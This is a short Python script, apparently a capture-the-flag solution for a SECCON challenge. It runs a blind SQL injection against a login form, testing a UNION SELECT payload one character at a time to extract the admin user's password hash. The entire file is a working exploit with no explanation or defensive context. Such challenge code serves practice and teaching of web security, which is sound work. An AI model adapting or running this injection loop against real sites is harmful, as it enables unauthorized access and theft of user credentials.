#!/usr/bin/env python3
import sys
import requests

payload = "' union select '6102b0591250cea64f303ec4a9c6425f' FROM users WHERE username='admin' AND SUBSTR(password, {}, 1)='{}' -- "
password_length = 32

password = ""

for i in range(1, password_length + 1):
    sys.stdout.flush()
    for c in "0123456789abcdef":
        data = {"user": payload.format(i, c), "pass": "oalieno", "login": "Login"}
        req = requests.post("http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi?", data = data)
        if "Login Error!" not in req.text:
            password += c
            break

print('admin password:', password)
